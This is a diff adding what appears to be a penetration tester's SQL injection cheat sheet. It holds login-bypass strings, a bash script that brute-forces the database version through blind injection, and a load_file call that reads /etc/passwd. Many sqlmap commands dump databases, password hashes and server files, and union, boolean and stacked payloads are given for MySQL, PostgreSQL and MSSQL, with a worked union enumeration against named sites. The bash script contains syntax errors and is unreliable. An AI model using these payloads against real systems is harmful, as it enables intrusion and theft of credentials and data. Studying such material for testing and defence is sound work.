@@ -1,0 +1,163 @@
+#pull all tables
+' or ''='
+#commenting whitespace:
+'/**/or/**/''='
+
+blind sql injection script
+this would change
+@@version,1,1
+
+#!/bin/bash
+charset=`echo {0..9} {A..z} \. \: \, \; \- \_ \@`
+export URL="http://blind.sqli.site/banddetails.php"
+export truestring ="this is a return statement"
+for i in $charset
+do
+	wget "URL?band=test' and substring(@@version,1,1)='$i" -q -0 - | grep "$truestring" &> /dev/null
+	if [ "$?" -- "0"]
+	then
+		echo char found $i
+		break
+	fi
+done
+
+
+mysql:
+select load_file("/etc/passwd");
+find 
+1.1.1.1/sql/example.php?name=root
+SELECT * FROM users WHERE name='[INPUT]';
+
+url encode and add in burp - 1234, spaces, double quote, single quote
+
+' union select @@version#
+
+
+
+sqlmap -u //http://192.168.121.159/kzMb5nVYJw/420search.php?usrtosearch=a
+sqlmap -u //http://192.168.121.159/kzMb5nVYJw/420search.php?usrtosearch=a --current-db
+sqlmap -u //http://192.168.121.159/kzMb5nVYJw/420search.php?usrtosearch=a -D seth -dump
+
+echo c6d6bd7ebf806f43c76acc3681703b81 | base64 -d ;echo
+
+
+sqlmap -u http://meh.com --forms --batch --crawl=10  --cookie=jsessionid=54321 --level=5 --risk=3
+
+Automated sqlmap scan
+
+sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords --file-read="/var/www/blah.php" 
+Targeted sqlmap scan
+
+sqlmap -u "http://meh.com/meh.php?id=1" --dbms=mysql --tech=U --random-agent --dump 
+Scan url for union + error based injection with mysql backendand use a random user agent + database dump
+
+sqlmap -o -u "http://meh.com/form/" --forms
+sqlmap check form for injection
+
+sqlmap -o -u "http://meh/vuln-form" --forms  -D database-name -T users --dump
+sqlmap dump and crack hashes for table users on database-name.
+
+
+
+use union with ALL, use null in union injections to bypass
+phpids - site to test encodings
+packetstormsecurity.org/web/unicode-fun.txt
+
+sql injections
+
+stacked - ; select sleep(5)#
+https://www.example.com/index.php?id=1
+so the sql query might look like this:
+select * from table where id=1
+and we could do something like this:
+https://www.example.com/index.php?id=1; select sleep(5)#
+to make the query look like this:
+select * from table where id=1; select sleep(5)#
+
+boolean - asdf' or email = 'admin'#
+https://www.example.com/index.php?id=1
+so the sql query might look like this:
+select * from table where id=1
+and we could do something like this:
+https://www.example.com/index.php?id=1 or username = 'bperry'#
+asdf' or email = 'admin'#
+
+union - union select null,email,pwd,null from users#
+https://www.example.com/index.php?id=1 union select null,email,pwd,null from users#
+
+firefox addons - web dev / tamper data / sql inject me
+
+inline injection signatures
+general
+1' or '1'='1  -- always true
+value' or '1'='2 -- same as orig value
+1' and '1'='2 -- always false
+we can add parens to separate 'and/or' like: 1') or ('1'='1
+commented lines only have parens after the first arg
+
+postgresql
+php?category=bi'||'kes
+1' or 'ab'='a'||'b
+comment with --, multiline /* */
+
+MSSQL
+php?category=bi'+'kes
+1' or 'ab'='a'+'b
+comment with --, multiline /* */
+
+mysql
+php?category=bi' 'kes
+1' or 'ab'='a' 'b
+comment with -- requires space or newline after comment, or #, multiline /* */
+
+multiple statements:
+remove "'" for numeric, use # for mysql comment
+';[SQL statement];--
+
+
+getting an order...
+#1 try to get an error #2 try union #3 blind
+identify the injection
+determine injection type - integer or string
+id=1 -- integer no tick needed
+id=x -- tick needed, making it id=x '
+
+example of id=1
+?id=1 or 1=convert(int,(USER))--
+replace user with DB_NAME, @@servername, @@version
+
+testing for union
+?id=1 union select all 1--
+?id=1 union select all 1,2--
+?id=1 union select all 1,2,3--
+
+#no error here, try replacing something like:
+?id=1 union select all 1,2,3,4--
+?id=1 union select all 1,USER,3,4--
+
+?id=null union all select 1,2,3,4,5,6,7/*
+6 is printed, try:
+?id=null union all select 1,2,3,4,5,@@version,7/*
+
+example of string... there was a lot of errors and tshoot here:
+liljon.com/liljon.asp?lil='
+liljon.com/liljon.asp?lil=71%20or%201=convert(int,(USER))--
+paren error, keep trying parens:
+liljon.com/liljon.asp?lil=71%20or%201=convert(int,(USER)))--
+liljon.com/liljon.asp?lil=71%20or%201=convert(int,(USER))))--
+
+?id=5%20UNION%20ALL%20%SELECT%201--
+?id=5%20UNION%20ALL%20%SELECT%201,2--
+text, ntext, image data type can't be selected as distinct
+#3 field was some odd thing
+?id=5%20UNION%20ALL%20SELECT%201,2,convert(text,'HELLO')--
+?id=5%20UNION%20ALL%20SELECT%201,2,convert(text,'HELLO'),4--
+?id=5%20UNION%20ALL%20SELECT%201,2,convert(text,'HELLO'),4,5--
+operand type clash - text is incompatible with int
+#6 had a different data type
+?id=5%20UNION%20ALL%20SELECT%201,2,convert(text,'HELLO'),4,5,null,7--
+
+
+
+id=2 or 1'='1'
+id=2 or 1 like 1
